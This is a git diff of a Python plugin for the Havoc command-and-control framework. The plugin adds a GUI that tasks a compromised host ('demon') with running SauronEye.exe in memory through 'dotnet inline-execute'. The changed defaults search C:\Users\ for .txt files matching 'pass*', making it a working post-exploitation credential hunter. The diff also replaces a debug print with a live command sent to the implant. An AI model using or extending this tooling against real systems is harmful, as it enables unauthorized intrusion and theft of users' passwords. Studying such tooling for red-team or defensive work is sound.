@@ -1,31 +1,37 @@
 #!/usr/bin/env python
 #Author : Cipher007
 
+# To-do : 
+# - Fix the file content error
+# - Add in date range
+# - Add option for system dirs
+# - Add a macro checker option
+# - Support for multiple directories
+
+
 import havocui
 import havoc
-import os
+import os, re
 
 sauron_eye = havocui.Widget("SauronEye", True)
 
 demons = []
 select_demon = None
-dir_to_search = "C:\\"
-filetypes = ""
+dir_to_search = "C:\\Users\\"
+filetypes = ".txt"
 check_contents = False
-keywords = ""
-keywords_dict = ".txt"
+keywords = "pass*"
+keywords_dict = "pass*"
+extensions_dict = ".txt"
 
-# Files to search for
-txt_files = False
-xml_files = False
 
-def select_text():
-    global txt_files
-    txt_files = not txt_files
+def add_extensions(text):
+    global filetypes
+    global extensions_dict
 
-def select_xml():
-    global xml_files
-    xml_files = not xml_files
+    extensions_dict = text
+    filetypes = replace(extensions_dict)
+
 
 def set_directory(text):
     global dir_to_search
@@ -33,6 +39,7 @@ def set_directory(text):
 
 def get_demon(num):
     global demons
+    global select_demon
     if num != 0:
         select_demon = havoc.Demon(demons[num-1])
 
@@ -40,34 +47,38 @@ def func_check_contents():
     global check_contents
     check_contents = not check_contents
 
-def add_keywords():
+def add_keywords(text):
     global keywords
+    global keywords_dict
+
+    keywords_dict = text
+    keywords = replace(keywords_dict) 
+
+def replace(text):
+    pattern = r"\s+"
+    return re.sub(pattern, " ", text).strip()
 
 def run_sauron():
     global select_demon
     global filetypes
     global keywords
-    global txt_files
-    global xml_files
     global check_contents
     global dir_to_search
 
-    cwd = os.getcwd()
+    contents = ""
+    #cwd = os.getcwd()
+    cwd = "/home/cipher/Github/havoc-SauronEye"
     if select_demon is None:
         havocui.messagebox("ERROR", "Please select a demon!")
+        return
 
-    if txt_files:
-        filetypes += " .txt"
-    if xml_files:
-        filetypes += " .xml"
     if check_contents:
         contents = "--contents"
 
     TaskID = select_demon.ConsoleWrite( select_demon.CONSOLE_TASK, "Tasked demon to run SauronEye!" )
 
-    query = "-d {dir_to_search} --filetypes{filetypes} {contents} --keywords{keywords}"
- #   select_demon.Command(TaskID, "dotnet inline-execute {cwd}/SauronEye.exe %s" % query)
-    print("dotnet inline-execute {cwd}/SauronEye.exe %s" % query)
+    query = f"-d {dir_to_search} --filetypes {filetypes} {contents} --keywords {keywords}"
+    select_demon.Command(TaskID, "dotnet inline-execute %s/SauronEye.exe %s" % (cwd,query))
 
 
 def sauroneye():
@@ -80,8 +91,7 @@ def sauroneye():
     sauron_eye.addLineedit(dir_to_search, set_directory)
     sauron_eye.addCheckbox("Search file contents", func_check_contents)
     sauron_eye.addLabel("<span style='color:#71e0cb'>File types:</span>")
-    sauron_eye.addCheckbox("Text files (*.txt)", select_text)
-    sauron_eye.addCheckbox("XML files (*.xml)", select_xml)
+    sauron_eye.addLineedit(extensions_dict, add_extensions)
     sauron_eye.addLabel("<span style='color:#71e0cb'>Add keywords to search for seperated by a comma:</span>")
     sauron_eye.addLineedit(keywords_dict, add_keywords)
 
